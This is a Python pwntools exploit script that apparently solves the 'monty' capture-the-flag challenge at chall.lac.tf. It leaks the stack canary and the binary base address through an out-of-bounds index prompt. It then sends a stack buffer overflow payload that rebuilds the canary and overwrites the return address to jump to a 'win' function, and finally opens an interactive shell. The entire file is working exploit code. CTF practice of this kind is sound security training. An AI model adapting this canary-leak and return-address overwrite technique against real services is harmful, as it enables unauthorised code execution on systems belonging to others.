#!/usr/bin/env python3

from pwn import *

exe = ELF("./monty")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, '''
                break *game+744
                ''')
    else:
        r = remote("chall.lac.tf", 31132)

    return r


def leak_stack_position(index: int) -> int:
    r.sendlineafter(b"peek? ", f"{index}".encode("ascii"))
    return int(r.recvline()[8:-1])


def main():
    r = conn()

    canary = leak_stack_position(55)
    exe.address = leak_stack_position(57) - (exe.symbols["main"] + 48)

    log.info(f"Canary: 0x{canary:x}")
    log.info(f"Binary base address: 0x{exe.address:x}")

    # padding + canary + RBP + ret_addr
    payload = b'A' * 24 + p64(canary) + b"B" * 8 + p64(exe.symbols['win'])
    r.sendlineafter(b"lady! ", b"1")
    r.sendlineafter(b"Name: ", payload)

    r.interactive("$ ")


if __name__ == "__main__":
    main()
